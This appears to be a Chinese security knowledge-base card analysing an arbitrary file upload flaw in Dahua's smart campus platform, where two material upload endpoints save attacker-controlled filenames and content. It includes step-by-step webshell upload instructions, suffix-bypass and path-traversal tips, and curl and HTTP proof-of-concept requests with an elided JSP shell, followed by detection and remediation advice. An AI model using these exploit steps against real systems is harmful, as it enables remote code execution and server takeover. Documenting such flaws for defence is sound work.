---
id: web-java-component-dahua-material-file-upload-webshell
title: 大华智慧园区 MaterialController 任意文件上传：原始文件名与内容直写 Web 目录
type: scenario
domain: web
path: web/java/component
technique: dahua-material-file-upload-webshell
tags:
- java
- dahua
- wpms
- file-upload
- webshell
- multipart
- material
- fileutil
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V211
  verified_at: '2026-11-07T04:48:55+08:00'
  notes: 已对照原文与 img44-54 核对：/material/file/video（Filedata）与 /material/file/image（file）字段、buildMaterialFile 原始文件名/字节、MaterialServiceImpl.addVideoFile/addImageFile、FileManageService.sendFile、FileUtil.writeBytes 链路均与原文一致。未验证点：generateFileName 实现与上传目录是否 Web 可访问原文未展开，原文未附上传成功/访问截图；卡片已注明边界。
url: /docs/web/java/component/web-java-component-dahua-material-file-upload-webshell/
draft: false
kb_aliases:
- 大华智慧园区 任意文件上传
- MaterialController addVideoFile
- MaterialController addImageFile
- FileUtil.writeBytes
- 大华园区 getshell
- FileManageService.sendFile
---

## 一句话结论

大华智慧园区 `/material/file/video` 与 `/material/file/image` 接口把 multipart 的原始文件名和字节内容交给 `MaterialService.addVideoFile/addImageFile`，最终 `FileManageService.sendFile` 拼出 `rootPath + directory + filename` 并调用 `FileUtil.writeBytes` 写文件；文件名/后缀/内容均未做安全校验，可上传 JSP 到 Web 可访问目录并执行。

## 原理

- `MaterialController.addVideoFile`（`@RequestMapping("/material/file/video", POST)`）把请求强转 `MultipartHttpServletRequest`，取 `Filedata`；`addImageFile`（`/material/file/image`）取 `file`。
- `buildMaterialFile` 直接 `setOriginalFilename(multipartFile.getOriginalFilename())`、`setContent(multipartFile.getBytes())`，原始文件名和内容完全由请求控制。
- `MaterialServiceImpl.addVideoFile/addImageFile` 调用 `fileManageService.generateFileName(originalFilename)` 生成保存名（保留原后缀），设置 `directory=VIDEO/IMAGE`，再调 `sendFile(directory, fileName, content)`。
- `FileManageService.sendFile` 计算 `filePath = getFileRootPath() + directory + File.separator`，调用 `FileUtil.writeBytes(sourceBytes, filePath, fileName)`；`FileUtil.writeBytes` 拼接 `getFolder(targetFolder) + targetFile`，`new FileOutputStream(targetFile).write(sourceBytes)`，没有扩展名、MIME、内容或路径穿越校验。
- 为什么成立：上传目录位于应用可访问路径（或 Web 根映射），JSP 后缀被容器解析；文件名由原始名派生且保留后缀，攻击者只需让保存名以 `.jsp` 结尾。
- 边界：原文只做源码审计，未给出实际上传成功/访问截图；`generateFileName` 的具体实现（是否加 UUID、是否过滤字符）未完整展示，需按实际版本确认后缀是否保留。

## 触发条件

- 目标为大华智慧园区平台，`/material/file/video` 或 `/material/file/image` 可从攻击者网络访问。
- 接口无需有效登录态，或攻击者已有低权限会话（取决于鉴权配置）。
- `fileManageService.getFileRootPath()` 指向 Web 可访问目录，且容器解析 JSP。
- `generateFileName` 保留原始后缀或允许可控后缀。

## 利用步骤

1. 准备一个最小 JSP WebShell（如 `<%@ page import="java.util.*,java.io.*"%><% ... %>`），文件名为 `shell.jsp`。
2. 对视频接口发送 multipart：字段名 `Filedata`，文件名 `shell.jsp`，内容为 JSP 字节。
3. 对图片接口重复：字段名 `file`，文件名 `shell.jsp`。
4. 从响应 `MaterialFileVO` 中读取保存路径/文件名（接口会返回 `path`/`fileName`），或按 `directory=VIDEO/IMAGE` 与生成规则推测。
5. 访问 `http://target/<上传路径>/shell.jsp`，确认 JSP 执行并获取命令回显。
6. 若后缀被改写，尝试双后缀（`shell.jsp.jpg`）、尾随空格/点、`filename*=UTF-8''shell.jsp` 等，结合容器解析差异。

## PoC

```bash
# 视频接口：字段 Filedata
curl -s -X POST 'http://target/material/file/video' \
  -F 'Filedata=@shell.jsp;filename=shell.jsp;type=application/octet-stream'

# 图片接口：字段 file
curl -s -X POST 'http://target/material/file/image' \
  -F 'file=@shell.jsp;filename=shell.jsp;type=image/jpeg'
```

```http
POST /material/file/video HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="Filedata"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%><% ... %>
------x--
```

## 变体与关联

- 变体：图片接口的 `directory=IMAGE` 与视频接口的 `directory=VIDEO` 可能对应不同上传根目录/访问路径；分别测试。
- 变体：若 `generateFileName` 加 UUID 但保留后缀，响应中会返回实际文件名，直接访问即可；若后缀被过滤，尝试大小写、双后缀、`;`/空格/点截断。
- 变体：`fileName` 若可含 `../`，可能路径穿越写到 Web 根或其它目录；结合 `FileUtil.writeBytes` 的 `getFolder` 逻辑测试。
- 关联：[[web-generic-file-upload-crm-sendfile-jsp-preserve-suffix]]（sendFile + 原始后缀保留的同类模式）、[[web-generic-file-upload-multipart-filename-traversal-ssh-key]]、[[web-generic-file-upload-spring-temppath-original-filename-traversal-jsp]]。
- 边界：上传目录若不在 Web 根或 JSP 被禁用，只能造成任意文件写入/覆盖；原文未给出实际 getshell 截图。

## 检测与防御

- **检测特征**：multipart 文件名以 `.jsp`/`.jspx`/`.jspf` 结尾；上传后短时间内访问新文件；`MaterialController` 上传接口返回的路径被直接请求。
- **修复**：服务端生成随机文件名并强制扩展名白名单（图片/视频后缀），校验 MIME/魔数；上传目录置于 Web 根之外，通过鉴权下载接口读取；禁用上传目录的脚本解析。
- **加固**：限制文件大小/数量；对文件名做 `getCanonicalPath` 前缀校验防穿越；WAF 拦截 JSP 上传；容器关闭不必要的 JSP 解析。
